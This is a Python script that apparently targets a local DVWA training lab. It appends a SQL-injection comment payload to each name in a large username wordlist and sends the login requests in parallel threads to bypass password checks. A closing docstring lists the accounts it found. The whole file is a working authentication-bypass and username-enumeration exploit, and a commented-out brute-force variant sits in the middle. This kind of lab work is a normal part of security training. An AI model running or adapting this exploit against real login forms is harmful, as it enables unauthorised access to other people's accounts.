import itertools
import string
import threading
import time

import requests

HOST = "127.0.0.1"
URL = f"http://{HOST}/vulnerabilities/brute/?"
PARALLEL_MODE = True   # rather faster:  944.25 c against 1834.47 c
FILE_NAME = "files/xato-net-10-million-usernames-dup"
PHPSESSID = "1m5puhnra2lui353bvo0ot8s51"
SQLi = "'-- -"  # 'or''='  '-- ...

session = requests.Session()
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="PHPSESSID", value=PHPSESSID))
session.cookies.set_cookie(cookie=requests.cookies.create_cookie(name="security", value="low"))


def func(session, login, row):
    response = session.get(url=f"{URL}username={login}&password=&Login=Login#")
    if "Welcome" in response.text:
        print(f"user: {login.replace(SQLi, '')} row: {row}")


with open(f"{FILE_NAME}.txt") as f:
    logins = f.readlines()

logins = (login.strip() + SQLi for login in logins)

start = time.time()

for row, login in enumerate(logins, start=1):
    if PARALLEL_MODE:
        threading.Thread(target=func, args=(session, login, row)).start()
    else:
        response = session.get(url=f"{URL}username={login}&password=&Login=Login#")
        if "Welcome" in response.text:
            print(f"user: {login.replace(SQLi, '')} row: {row}")

# for c in itertools.product(string.ascii_lowercase + string.digits, repeat=4):
#     login = "".join(c) + SQLi
#
#     if PARALLEL_MODE:
#         threading.Thread(target=func, args=(session, login)).start()
#     else:
#         response = session.get(url=f"{URL}username={login}&password=&Login=Login#")
#         if "Welcome" in response.text:
#             print(f"user: {login}")

print(f"time: {round(time.time() - start, 2)} c")

"""
user: admin row: 2
user: pablo row: 935
user: Admin row: 1996
user: smithy row: 3713
user: Pablo row: 13711
user: 1337 row: 36933
user: Smithy row: 43582
user: SMITHY row: 74374
user: ADMIN row: 76288
user: PABLO row: 111320
user: gordonb row: 166548
time: 2819.72 c
"""
